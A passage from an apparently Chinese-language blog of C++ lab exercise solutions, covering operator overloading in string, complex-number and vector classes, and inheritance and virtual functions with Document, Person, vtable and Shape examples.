class="keyword">this</span>-&gt;length + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;str, another.str);</span><br><span class="line">&#125;</span><br><span class="line">MyString&amp; MyString::<span class="keyword">operator</span>=(<span class="type">const</span> MyString&amp; another) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> == &amp;another) &#123; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;str != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] <span class="keyword">this</span>-&gt;str; <span class="keyword">this</span>-&gt;str = <span class="literal">NULL</span>; <span class="keyword">this</span>-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">this</span>-&gt;length = another.length;</span><br><span class="line"><span class="keyword">this</span>-&gt;str = <span class="keyword">new</span> <span class="type">char</span>[<span class="keyword">this</span>-&gt;length + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(<span class="keyword">this</span>-&gt;str, another.str);</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span>&amp; MyString::<span class="keyword">operator</span>[](<span class="type">int</span> index) &#123; <span class="keyword">return</span> (<span class="keyword">this</span>-&gt;str[index]); &#125;</span><br><span class="line"><span class="type">bool</span> MyString::<span class="keyword">operator</span>==(MyString&amp; another) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span> == &amp;another) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;length != another.length) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strcmp</span>(<span class="keyword">this</span>-&gt;str, another.str) != <span class="number">0</span>) &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> MyString::<span class="keyword">operator</span>!=(MyString&amp; another) &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == another); &#125;</span><br><span class="line">MyString MyString::<span class="keyword">operator</span>+(<span class="type">const</span> MyString&amp; another) &#123;</span><br><span class="line"><span class="type">int</span> len = <span class="keyword">this</span>-&gt;length + another.length + <span class="number">1</span>;</span><br><span class="line"><span class="function">MyString <span class="title">str1</span><span class="params">(len)</span></span>;</span><br><span class="line"><span class="built_in">strcat</span>(str1.str, <span class="keyword">this</span>-&gt;str);</span><br><span class="line"><span class="built_in">strcat</span>(str1.str, another.str);</span><br><span class="line"><span class="keyword">return</span> str1;</span><br><span class="line">&#125;</span><br><span class="line">MyString::~<span class="built_in">MyString</span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">this</span>-&gt;str != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] <span class="keyword">this</span>-&gt;str; <span class="keyword">this</span>-&gt;str = <span class="literal">NULL</span>; <span class="keyword">this</span>-&gt;length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; cout, MyString&amp; myString) &#123;</span><br><span class="line"><span class="keyword">if</span> (myString.str != <span class="literal">NULL</span>)cout &lt;&lt; myString.str;</span><br><span class="line"><span class="keyword">return</span> cout;</span><br><span class="line">&#125;</span><br><span class="line">istream&amp; <span class="keyword">operator</span> &gt;&gt; (istream&amp; cin, MyString&amp; myString) &#123;</span><br><span class="line"><span class="keyword">if</span> (myString.str != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] myString.str;</span><br><span class="line">myString.str = <span class="literal">NULL</span>;</span><br><span class="line">myString.length = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> temp[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">cin &gt;&gt; temp;</span><br><span class="line"><span class="type">int</span> len = <span class="built_in">strlen</span>(temp);</span><br><span class="line">myString.length = len;</span><br><span class="line">myString.str = <span class="keyword">new</span> <span class="type">char</span>[len + <span class="number">1</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(myString.str, temp);</span><br><span class="line"><span class="keyword">return</span> cin;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">MyString a = <span class="string">&quot;good student&quot;</span>;</span><br><span class="line">MyString b = <span class="string">&quot;good&quot;</span>;</span><br><span class="line">b += <span class="string">&quot;student&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (a != b) cout &lt;&lt; <span class="string">&quot;not same&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-完善-complex-类使得-main-函数中的操作都能够完成">2. 完善 complex 类使得 main 函数中的操作都能够完成</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Complex</span>(<span class="type">double</span> r = <span class="number">0</span>, <span class="type">double</span> i = <span class="number">0</span>) &#123;</span><br><span class="line">        real = r; imag = i;</span><br><span class="line">    &#125;</span><br><span class="line">    ~<span class="built_in">Complex</span>() &#123;&#125;</span><br><span class="line">    Complex <span class="keyword">operator</span> -(Complex&amp;);</span><br><span class="line">    Complex <span class="keyword">operator</span> +(Complex&amp;);</span><br><span class="line">    <span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp;, Complex&amp;);</span><br><span class="line">    <span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp;, Complex&amp;);</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>==(Complex&amp; c1, Complex&amp; c2);</span><br><span class="line">    <span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span>!=(Complex&amp; c1, Complex&amp; c2);</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">getReal</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;real; &#125;</span><br><span class="line">    <span class="function"><span class="type">double</span> <span class="title">getImag</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;imag; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">double</span> real; <span class="type">double</span> imag;</span><br><span class="line">&#125;;</span><br><span class="line">Complex Complex::<span class="keyword">operator</span>-(Complex&amp; c) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Complex</span>(real - c.real, imag - c.imag);</span><br><span class="line">&#125;</span><br><span class="line">Complex Complex::<span class="keyword">operator</span>+(Complex&amp; c) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Complex</span>(real + c.real, imag + c.imag);</span><br><span class="line">&#125;</span><br><span class="line">istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp; in, Complex&amp; c) &#123;</span><br><span class="line">    in &gt;&gt; c.real &gt;&gt; c.imag; <span class="keyword">return</span> in;</span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out, Complex&amp; c) &#123;</span><br><span class="line">    out &lt;&lt; c.real &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; c.imag &lt;&lt; <span class="string">&quot;i\n&quot;</span>; <span class="keyword">return</span>  out;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> == (Complex&amp; c1, <span class="type">double</span>&amp; a) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c1.<span class="built_in">getReal</span>() == a &amp;&amp; c1.<span class="built_in">getImag</span>() == a) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> == (Complex&amp; c1, Complex&amp; c2) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c1.real == c2.real &amp;&amp; c1.imag == c2.imag) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">bool</span> <span class="keyword">operator</span> != (Complex&amp; c1, Complex&amp; c2) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c1.real != c2.real || c1.imag != c2.imag) &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123; <span class="keyword">return</span> <span class="literal">false</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Complex::display</span><span class="params">()</span> </span>&#123; cout &lt;&lt; real &lt;&lt; <span class="string">&quot;+&quot;</span> &lt;&lt; imag &lt;&lt; <span class="string">&quot;i\n&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Complex a, <span class="built_in">b</span>(<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="function">Complex <span class="title">d</span><span class="params">(<span class="number">0</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="function">Complex <span class="title">e</span><span class="params">(<span class="number">3.5</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (a != b) cout &lt;&lt; <span class="string">&quot;not same&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">if</span> (a == d) cout &lt;&lt; <span class="string">&quot;zero&quot;</span> &lt;&lt; endl;</span><br><span class="line">    Complex c = e + b;</span><br><span class="line">    cout &lt;&lt; c &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-编写向量类-vector-使得下面的操作能够完成">3. 编写向量类 vector 使得下面的操作能够完成</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEFAULT_SIZE 4</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">vector</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> size; <span class="type">int</span> cap; <span class="type">int</span>* element;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">vector</span>() &#123;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line">cap = DEFAULT_SIZE;</span><br><span class="line">element = <span class="keyword">new</span> <span class="type">int</span>[cap];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">vector</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">size = a;</span><br><span class="line">cap = a + DEFAULT_SIZE;</span><br><span class="line">element = <span class="keyword">new</span> <span class="type">int</span>[cap];</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span>&amp; <span class="keyword">operator</span>[](<span class="type">int</span> index) &#123; <span class="keyword">return</span> element[index]; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reserve</span><span class="params">(<span class="type">int</span> new_capacity)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (new_capacity &lt;= cap) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="type">int</span>* newelement = <span class="keyword">new</span> <span class="type">int</span>[new_capacity];</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i != size; i++) &#123; newelement[i] = <span class="built_in">move</span>(element[i]); &#125;</span><br><span class="line"><span class="built_in">swap</span>(newelement, element);</span><br><span class="line"><span class="keyword">delete</span>[] newelement;</span><br><span class="line">cap = new_capacity;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">resize</span><span class="params">(<span class="type">int</span> new_size)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (new_size &lt; <span class="number">0</span>) &#123; <span class="keyword">return</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (new_size &gt; cap) &#123; <span class="built_in">reserve</span>(size * <span class="number">2</span>); &#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = size; i &lt; new_size; i++) &#123; element[i] = <span class="number">0</span>; &#125;</span><br><span class="line">size = new_size;</span><br><span class="line">&#125;</span><br><span class="line">~<span class="built_in">vector</span>() &#123;</span><br><span class="line"><span class="keyword">if</span> (element != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">delete</span>[] element;</span><br><span class="line">element = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">size = <span class="number">0</span>;</span><br><span class="line">cap = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">vector <span class="title">v</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) v[i] = i + <span class="number">1</span>;</span><br><span class="line">v.<span class="built_in">resize</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) cout &lt;&lt; v[i] &lt;&lt; endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验七">实验七</h2><h3 id="1．定义一个-Document-类，包含成员变量-name，从-Document-派生出-Book-类，增加-PageCount-数据成员。">1．定义一个 Document 类，包含成员变量 name，从 Document 派生出 Book 类，增加 PageCount 数据成员。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Document</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">string name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Document</span>() &#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setName</span><span class="params">(string name)</span> </span>&#123; <span class="keyword">this</span>-&gt;name = name; &#125;</span><br><span class="line"><span class="function">string <span class="title">getName</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;name; &#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> </span>&#123; cout &lt;&lt; name &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Book</span> : <span class="keyword">public</span> Document &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> PageCount;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setPageCount</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123; <span class="keyword">this</span>-&gt;PageCount = p; &#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;书名：&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;<span class="built_in">getName</span>() &lt;&lt; <span class="string">&quot; 书页：&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;PageCount &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">Book b; cout &lt;&lt; <span class="string">&quot;请输入书名:\n&quot;</span>;</span><br><span class="line">string name; cin &gt;&gt; name;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入书的页数:\n&quot;</span>; <span class="type">int</span> p; cin &gt;&gt; p;</span><br><span class="line">b.<span class="built_in">setPageCount</span>(p);</span><br><span class="line">b.<span class="built_in">setName</span>(name);</span><br><span class="line">b.<span class="built_in">printInfo</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-设计一个程序，通过单继承，使得-student-类派生自-person-类，并增加学号、专业数据成员，同时通过虚函数实现信息输出多态。">2. 设计一个程序，通过单继承，使得 student 类派生自 person 类，并增加学号、专业数据成员，同时通过虚函数实现信息输出多态。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">string name; <span class="type">int</span> age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Person</span>() &#123;&#125;</span><br><span class="line"><span class="built_in">Person</span>(string n, <span class="type">int</span> a) :<span class="built_in">name</span>(n), <span class="built_in">age</span>(a) &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; age &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> id; string major;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Student</span>(string n, <span class="type">int</span> a, <span class="type">int</span> i, string m) :<span class="built_in">Person</span>(n, a), <span class="built_in">id</span>(i), <span class="built_in">major</span>(m) &#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">printInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;姓名：&quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; 年龄：&quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; 学号：&quot;</span> &lt;&lt; id &lt;&lt; <span class="string">&quot; 专业：&quot;</span> &lt;&lt; major &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">print</span><span class="params">(Person&amp; p)</span> </span>&#123; p.<span class="built_in">printInfo</span>(); &#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="function">Student <span class="title">s</span><span class="params">(<span class="string">&quot;张三&quot;</span>, <span class="number">19</span>, <span class="number">2020</span>, <span class="string">&quot;计算机&quot;</span>)</span></span>; <span class="built_in">print</span>(s);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-编写一个程序用来证明虚函数表的存在，并通过实验探讨在-VC-或-Dev-C-编译器中，虚函数表是如何管理的。">3. 编写一个程序用来证明虚函数表的存在，并通过实验探讨在 VC 或 Dev-C 编译器中，虚函数表是如何管理的。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">F1</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;A::F1()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _a;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span> : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">F1</span><span class="params">()</span> </span>&#123; cout &lt;&lt; <span class="string">&quot;B::F1()&quot;</span> &lt;&lt; endl; &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a; A* p;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入a的大小：&quot;</span>; cin &gt;&gt; a;</span><br><span class="line"><span class="keyword">if</span> (a &gt; <span class="number">5</span>) &#123; p = <span class="keyword">new</span> A; &#125;</span><br><span class="line"><span class="keyword">else</span> &#123; p = <span class="keyword">new</span> B; &#125;</span><br><span class="line">p-&gt;<span class="built_in">F1</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-在例-7-6-的基础上，增加派生自-Shape-的矩形-Rectangle-类和三角形-Triangle-类。">4. 在例 7-6 的基础上，增加派生自 Shape 的矩形 Rectangle 类和三角形 Triangle 类。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Shape</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="type">const</span> <span class="type">static</span> <span class="type">double</span> pi;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">getArea</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">getGirth</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line"><span class="type">double</span> <span class="keyword">operator</span>+(Shape&amp; other) &#123; <span class="keyword">return</span> <span class="built_in">getArea</span>() + other.<span class="built_in">getArea</span>(); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> Shape::pi = <span class="number">3.141593</span>;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Round</span> : <span class="keyword">public</span> Shape &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="type">int</span> _x, _y; <span class="type">int</span> _r;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="built_in">Round</span>(<span class="type">int</span> x = <span class="number">0</span>, <span class="type">int</span> y = <span class="number">0</span>, <span class="type">int</span> r = <span class="number">0</span>) : _x(x), _y(y), _r(r) &#123; &#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">getArea</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> Shape::pi * _r * _r; &#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span 